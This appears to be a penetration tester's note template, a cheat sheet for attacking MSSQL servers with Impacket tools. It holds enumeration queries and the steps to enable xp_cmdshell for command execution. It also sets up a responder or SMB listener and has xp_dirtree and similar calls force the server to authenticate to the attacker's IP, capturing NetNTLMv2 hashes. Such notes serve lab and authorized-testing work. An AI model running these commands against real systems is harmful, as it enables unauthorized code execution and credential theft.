# MSSQL - <% tp.frontmatter.current_port %>
**Using some Impacket tools**

## Connecting
(If using kali try `impacket-mssqlclient`)
```bash
mssqlclient.py <user>@<% tp.frontmatter.target_ip %> -windows-auth
```

### Database enumeration
**After being connected**
```bash
select name from sys.databases 
```

```bash
EXEC sp_databases
```

```bash
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

```bash
SELECT name FROM master.sys.databases
```

**Switch DBs**
```bash
use <db>
```

```bash
SELECT name FROM sysobjects WHERE xtype = 'U'
```

**Show all tables of DB**
```bash
SELECT * FROM <db_NAME>.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'
```

### Code execution
**You don't always have permissions, but good to try**

```bash
EXEC sp_configure 'show advanced options', '1'
```

```bash
RECONFIGURE
```

```bash
EXEC sp_configure 'xp_cmdshell', '1' 
```

```bash
RECONFIGURE
```

**Example of code execution (If the above commands work)**
```bash
xp_cmdshell "whoami"
```

### Capturing NETNTLMV2 Hash
#### Capture hash
On your machine (If using kali try `impacket-smbserver`)
```bash
sudo smbserver.py share ./ -smb2support
```

```bash
sudo responder -I tun0
```

#### Send the Hash
A couple different ways to send a hash (These are done within MSSQL)
```bash
xp_dirtree '\\<% tp.frontmatter.my_ip %>\pwn'
```

```bash
exec master.dbo.xp_dirtree '\\<% tp.frontmatter.my_ip %>\pwn'
```

```bash
EXEC master..xp_subdirs '\\<% tp.frontmatter.my_ip %>\pwn'
```

```bash
EXEC master..xp_fileexist '\\<% tp.frontmatter.my_ip %>\pwn'
```


